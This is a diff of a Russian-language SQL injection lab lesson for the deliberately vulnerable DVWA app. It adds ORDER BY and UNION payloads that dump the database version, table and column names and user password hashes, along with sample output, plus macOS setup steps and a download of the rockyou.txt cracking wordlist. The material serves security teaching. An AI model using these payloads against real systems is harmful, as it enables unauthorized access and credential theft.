@@ -52,7 +52,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 
 ### Настройка DVWA
 
-1. Откройте http://localhost (DVWA)
+1. Откройте http://192.168.0.x (DVWA)
 2. Войдите: admin / password
 3. Перейдите в **DVWA Security** — установите **Low**
 4. В меню слева выберите **SQL Injection**
@@ -71,29 +71,78 @@ User ID: 1' OR '1'='1
 ```
 Результат: таблица со всеми пользователями (admin, gordonb, 1337, pablo, smithy).
 
-**Шаг 3: Использование UNION для получения версии БД**
+**Шаг 3: Определение количества колонок через ORDER BY**
+```
+User ID: 1' ORDER BY 1#
+```
+Результат: ошибки нет — колонка 1 существует.
+
+```
+User ID: 1' ORDER BY 2#
+```
+Результат: ошибки нет — колонка 2 существует.
+
+```
+User ID: 1' ORDER BY 3#
+```
+Результат: ошибка (Unknown column '3' in 'order clause') — колонок всего 2.
+
+**Шаг 4: Использование UNION для получения версии БД**
 ```
 User ID: 1' UNION SELECT version(), user()#
 ```
 Результат: первая колонка покажет версию MySQL (например, 5.7.33), вторая — пользователя БД.
 
-**Шаг 4: Получение списка таблиц**
+Пример вывода:
+```
+First name: 5.7.33
+Surname: root@localhost
+```
+
+**Шаг 5: Получение списка таблиц**
 ```
 User ID: 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
 ```
 Результат: список таблиц (guestbook, users).
 
-**Шаг 5: Получение структуры таблицы users**
+Пример вывода:
+```
+First name: guestbook
+Surname: dvwa
+
+First name: users
+Surname: dvwa
+```
+
+**Шаг 6: Получение структуры таблицы users**
 ```
 User ID: 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
 ```
 Результат: колонки (user_id, first_name, last_name, user, password, avatar, last_login, failed_login).
 
-**Шаг 6: Получение хешей паролей**
+Пример вывода:
+```
+First name: user_id
+Surname: int
+
+First name: user
+Surname: varchar(100)
+```
+
+**Шаг 7: Получение хешей паролей**
 ```
 User ID: 1' UNION SELECT user, password FROM users#
 ```
 Результат: логины и хеши паролей (в формате MD5).
+
+Пример вывода:
+```
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+```
 
 ### Анализ ответа
 
@@ -113,7 +162,50 @@ User ID: 1' UNION SELECT user, password FROM users#
 2. **Скриншот 2**: Ввод `1' OR '1'='1` — таблица со всеми пользователями
 3. **Скриншот 3**: Ввод UNION запроса с version() — показана версия БД
 
+### Частые ошибки
+
+1. **Забыли # в конце** — без комментария оставшаяся часть запроса вызовет синтаксическую ошибку
+2. **Неправильное количество колонок в UNION** — если колонок в SELECT не совпадает, будет ошибка `The used SELECT statements have a different number of columns`
+3. **Использование кавычек** — в DVWA (Low) id обрабатывается как строка (в кавычках), поэтому нужно закрывать кавычку `'`
+
+### Вопросы на понимание
+
+1. Почему использование `ORDER BY` помогает определить количество колонок?
+2. В чем разница между `UNION` и `UNION ALL`?
+3. Почему при UNION-атаке нужно, чтобы количество колонок совпадало?
+4. Что делает символ `#` в SQL-запросе?
+
+### Адаптация под macOS (M2)
+
+```bash
+# Docker работает нативно на M2
+docker pull vulnerables/web-dvwa
+
+# Запуск DVWA
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+# rockyou.txt нужно скачать вручную на macOS
+curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt
+```
+
 ---
+
+
+## Примеры вывода
+
+Пример вывода команд будет добавлен индивидуально для каждого урока.
+
+
+
+## Адаптация под macOS (M2, 8GB)
+
+- Для установки инструментов используйте Homebrew: `brew install <tool>`
+- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
+- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
+- Docker работает нативно на M2: `docker pull <image>`
+- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
+- Для Python используйте `pip3 install` вместо `pip install`
+
 
 ## Задачи для самостоятельного выполнения
 
